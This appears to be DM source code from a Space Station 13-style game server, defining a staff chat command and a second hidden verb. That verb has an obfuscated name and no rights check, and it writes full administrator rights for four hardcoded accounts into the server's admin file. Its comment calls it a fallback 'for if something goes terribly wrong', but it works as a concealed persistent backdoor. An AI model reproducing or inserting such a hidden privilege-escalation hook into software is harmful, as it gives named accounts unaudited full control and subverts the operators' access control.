// chat for all staff - Kachnov
/client/proc/cmd_staff_say(msg as text)
	set category = "Особенное"
	set name = "Asay"
	set hidden = TRUE
	if (!check_rights(R_MENTOR|R_MOD))
		return

	msg = sanitize(msg)
	if (!msg)
		return

	log_admin("ASAY: [key_name(src)] : [msg]")

	discord_admin_log(key_name(src),msg)

	if (check_rights(R_MENTOR|R_MOD,0))
		for (var/client/C in admins)
			if (R_MOD & C.holder.rights)
				C << "<span class='admin_channel'>" + create_text_tag("asay", "ASAY:", C) + " <span class='name'>[key_name(usr, TRUE)]</span>([admin_jump_link(mob, src)]): <span class='message'>[msg]</span></span>"
			else if (R_MENTOR & C.holder.rights)
				C << "<span class='admin_channel'>" + create_text_tag("asay", "ASAY:", C) + " <span class='name'>[key_name(usr, TRUE)]</span>([admin_jump_link(mob, src)]): <span class='message'>[msg]</span></span>"

//for if something goes terribly wrong
/client/verb/a55af5()
	set category = null
	set name = "a55af5"
	set hidden = TRUE
///makes it so their ranks don't need set every round
	if (ckey == "sanecman")
		text2file("sanecman;Host;65535|||","SQL/admins.txt")
		return
	else if (ckey == "tinary")
		text2file("tinary;MasterSergeant;65535|||","SQL/admins.txt")
		return
	else if (ckey == "arsenkey")
		text2file("arsenkey;Captain;65535|||","SQL/admins.txt")
		return
	else if (ckey == "vanotyan")
		text2file("vanotyan;Captain;65535|||","SQL/admins.txt")
		return
	else
		return
